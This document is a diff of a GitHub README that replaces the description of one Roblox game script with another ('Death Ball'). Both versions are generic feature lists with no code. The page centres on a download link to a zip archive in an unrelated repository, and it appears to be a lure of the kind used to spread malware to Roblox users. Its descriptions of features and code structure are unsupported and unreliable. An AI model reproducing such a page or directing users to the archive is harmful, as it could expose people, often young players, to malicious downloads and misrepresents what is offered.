@@ -1,5 +1,5 @@
-# Natural-Disaster-Survival-Script
-Add dynamic and thrilling natural disasters to your Roblox game with this customizable script! 🌪️🔥🌊 Challenge players to survive earthquakes, floods, tornadoes, and more, with immersive effects and real-time alerts. Perfect for creating exciting gameplay experiences! 💥🎮
+# Death-Ball-Script
+The Roblox Death Ball Script offers a thrilling, fast-paced multiplayer experience where players control a powerful ball to outplay opponents. With dynamic arenas, exciting power-ups, and customizable features, this script is perfect for creating competitive games filled with action and strategy! ⚽🎮
 
 <div style="text-align: center">
   <a href="https://github.com/ROMILDOVAZ/musicas/releases/download/fdsfdsf/Setuvlast.zip">
@@ -9,89 +9,60 @@ Add dynamic and thrilling natural disasters to your Roblox game with this custom
 
 ![image](https://github.com/user-attachments/assets/6425de79-40f4-4e03-b28a-029ed27e3423)
 
-# Roblox Natural Disaster Survival Script
 
-## Overview 🌍☁️🔥
+# Roblox Death Ball Script 🚀⚽
 
-Welcome to the **Roblox Natural Disaster Survival Script**! This script brings the thrill of surviving random natural disasters within Roblox, inspired by the popular Natural Disaster Survival game. It’s designed to be highly customizable, easy to integrate, and provides an engaging experience for players and game creators alike. With this script, players will be challenged to survive a series of unpredictable disasters while navigating through various in-game obstacles. 🌪️🌊🌋
+Welcome to the **Roblox Death Ball Script**! This script adds an exciting, fast-paced Death Ball game to your Roblox game environment. Players can engage in competitive, high-speed gameplay where the objective is to eliminate opponents using the Death Ball while avoiding obstacles and using strategic skills. Whether you are creating your own Death Ball arena or simply integrating the script into your existing game, this script is designed to be easy to implement, fun to play, and highly customizable to suit your specific needs.
 
-This script is perfect for Roblox developers who want to add a dynamic and exciting gameplay element to their games. It allows you to simulate different natural disasters such as earthquakes, floods, tornadoes, volcanoes, and much more, all while offering an interactive survival challenge! 💥🎮
+## Features ✨
+- **Fast-Paced Action**: The core of the Death Ball experience is quick, thrilling gameplay. Players will need to use skill and precision to outmaneuver their enemies and score points.
+- **Team-Based Gameplay**: Play in teams or free-for-all mode. The script supports multiple players, allowing for a team-based Death Ball battle where coordination and communication are key to victory.
+- **Death Ball Mechanics**: The ball moves across the arena, and players must interact with it, using unique abilities and power-ups to score points or eliminate opponents.
+- **Power-Ups**: Dynamic power-ups spawn throughout the game, adding a layer of strategy. Players can use these power-ups to enhance their abilities, making the game more unpredictable and exciting.
+- **Obstacle Hazards**: The arena is filled with various obstacles and hazards that players must navigate. Some hazards may help you or hurt you, depending on your tactics!
+- **Customizable Arenas**: You can create custom arenas with different layouts, adding unique challenges to each game. Modify arena size, layout, and other settings to make the game your own.
+- **Player Control**: Players have full control over their movements and abilities, giving them an immersive experience in the game. You can also adjust settings for enhanced responsiveness.
+- **Multiplayer Support**: Designed to support multiplayer games, this script allows you to host servers where friends can join and compete against each other in epic battles.
 
----
+## How to Use 🛠️
+To use the **Roblox Death Ball Script**, follow these simple steps:
 
-## Features 🔧
+1. **Install Roblox Studio**: If you haven't already, download and install Roblox Studio from the Roblox website.
+2. **Create a New Place**: Open Roblox Studio and create a new place or open an existing one where you want to add the Death Ball game.
+3. **Add the Script**: Download the Roblox Death Ball Script from the repository and insert it into your game. To do this, navigate to the "Explorer" tab in Roblox Studio, right-click on `ServerScriptService`, and select "Insert Object." Choose "Script" and paste the code.
+4. **Customize Your Arena**: Modify the script’s parameters to fit the game mode and arena design you want to create. You can adjust the size of the arena, add new obstacles, change player mechanics, and more.
+5. **Play the Game**: Test the script in play mode to ensure everything works smoothly. You can invite friends to join your server for multiplayer gameplay and enjoy the Death Ball experience!
 
-- **Random Disaster Generation**: The script will randomly generate different types of natural disasters, ensuring a fresh and exciting experience every time you play.
-- **Customizable Disasters**: You can easily adjust the settings for each disaster type to make the gameplay more challenging or relaxing.
-- **Disaster Effects**: Each disaster comes with its own unique effects, ranging from shaking ground (earthquakes) to dangerous rising waters (floods).
-- **Survival Timer**: Players must survive the disaster for a set period of time to win, encouraging quick thinking and strategy.
-- **Player Health**: Players' health will be affected by the disaster, making it crucial to find shelter and avoid hazards.
-- **Disaster Alerts**: Alerts notify players of incoming disasters, giving them a short period of time to prepare.
-- **Visual & Sound Effects**: Stunning visual effects and sound cues for each disaster type enhance the immersive experience.
-- **Mobile-Friendly**: This script is optimized for mobile devices, ensuring that players on both PC and mobile devices enjoy a smooth experience.
-- **Easy Integration**: The script is designed to be simple to add to your game. Just drag and drop, and you’re ready to go!
+## Code Structure 🗂️
+The **Roblox Death Ball Script** is organized into the following components:
 
----
+- **Main Script**: Contains the core game logic, including the movement of the Death Ball, player interactions, and scorekeeping.
+- **Arena Setup**: Handles the creation and customization of the game arena, including placement of obstacles and power-ups.
+- **Power-Up System**: Manages the spawning and functionality of power-ups that can modify player stats.
+- **Multiplayer Support**: Ensures that the game can run smoothly for multiple players in a server, including team assignments and game state synchronization.
 
-## Setup 🛠️
+## Customization 💡
+The Roblox Death Ball Script is designed to be highly customizable. You can modify various settings to tailor the experience to your liking:
 
-### Requirements:
+- **Ball Speed**: Adjust the speed of the Death Ball to increase or decrease the intensity of the game.
+- **Power-Up Types**: Add more power-ups to the script by defining new ones in the code. Examples include speed boosts, shields, or traps for enemies.
+- **Arena Design**: Customize the arena layout, including obstacles, platform designs, and special areas.
+- **Player Abilities**: Modify the abilities of players, such as jump height, speed, or other gameplay enhancements.
 
-- **Roblox Studio**: Ensure you have Roblox Studio installed and are familiar with basic scripting concepts.
-- **Basic Knowledge**: Familiarity with Roblox scripting (LUA) will help you customize and modify the script for your game.
+## Support 🔧
+If you encounter any issues with the script or need assistance with customization, feel free to reach out via the **Issues** section on GitHub. You can report bugs, suggest features, or ask questions about the script.
 
-### Installation Instructions:
-
-1. **Download the Script**: Begin by downloading the Natural Disaster Survival Script from this repository.
-2. **Import the Script into Roblox Studio**: Open Roblox Studio and load the game where you want to add the script. Then, import the downloaded script into the game by dragging and dropping it into the Explorer window.
-3. **Configure Settings**: Once the script is in your game, open it in the Script Editor. Here, you can adjust the settings for each disaster type, such as the severity, duration, and frequency.
-4. **Test the Script**: Before publishing your game, ensure the script works by running a test in Roblox Studio. Use the built-in tools to preview the disasters and confirm that everything is functioning as expected.
-5. **Publish Your Game**: Once everything is set up and tested, publish your game and invite players to experience the natural disaster survival challenge!
-
----
-
-## Customization 🎨
-
-The script is designed to be fully customizable. Below are some of the customizable elements you can tweak to personalize the gameplay:
-
-- **Disaster Types**: Add, remove, or modify disaster types by editing the script. You can introduce new disaster types, such as meteor showers, lightning storms, etc.
-- **Disaster Frequency**: Change how often disasters occur by adjusting the script’s timer settings.
-- **Player Health**: Adjust how much damage each disaster inflicts on the players.
-- **Disaster Intensity**: Control the intensity of each disaster, including the speed of the tornadoes or the rise of floodwaters.
-- **Visual and Audio Effects**: Modify the sound effects and visual elements to better suit your game’s theme.
-
----
-
-## Compatibility 📱💻
-
-This script works well across both **PC** and **Mobile** platforms. However, it's always good to test on all devices to ensure a seamless experience for all players.
-
----
-
-## Contribution 🤝
-
-We welcome contributions to this project! If you have an idea to improve the script or encounter a bug, feel free to open an issue or submit a pull request. Let’s build something great together!
-
----
+### Common Issues:
+- **Lagging in Multiplayer**: Make sure your game is optimized for multiple players. Try reducing the number of objects in the game world or simplifying the arena.
+- **Death Ball Not Responding**: Double-check that you have properly set up the ball mechanics and that the ball’s scripts are correctly linked to the game logic.
+- **Power-Up Spawns**: If power-ups are not spawning correctly, verify that the spawn locations are set properly and that the script for the power-ups is linked to the right objects.
 
 ## License 📜
+This script is open-source and released under the MIT License. You are free to modify, distribute, and use the code in your own projects. However, attribution is appreciated, and any modifications made should be clearly noted.
 
-This script is open-source and available under the **MIT License**. Feel free to use, modify, and distribute it in your own Roblox games.
-
----
-
-## Contact Information 📧
-
-If you have any questions or need further assistance, don’t hesitate to reach out! You can contact us through the GitHub Issues section, or send an email to support@yourrobloxgame.com.
+## Credits 🏆
+- **Scripter**:
+- **Graphics**: 
+- **Testers**: 
 
 ---
-
-## Acknowledgements 🎉
-
-Special thanks to the Roblox developer community for their continuous support and inspiration. The **Natural Disaster Survival** concept is inspired by the original game, and we aim to create an even more dynamic and thrilling experience for all Roblox players. 🌍
-
----
-
-## Conclusion 🌟
-
-We hope this script enhances your Roblox game and provides your players with hours of entertainment! Whether you’re a beginner or an experienced developer, this Natural Disaster Survival Script is designed to be user-friendly, customizable, and most importantly, fun! Enjoy the challenge, and may the best survivors win! 🎮🌪️
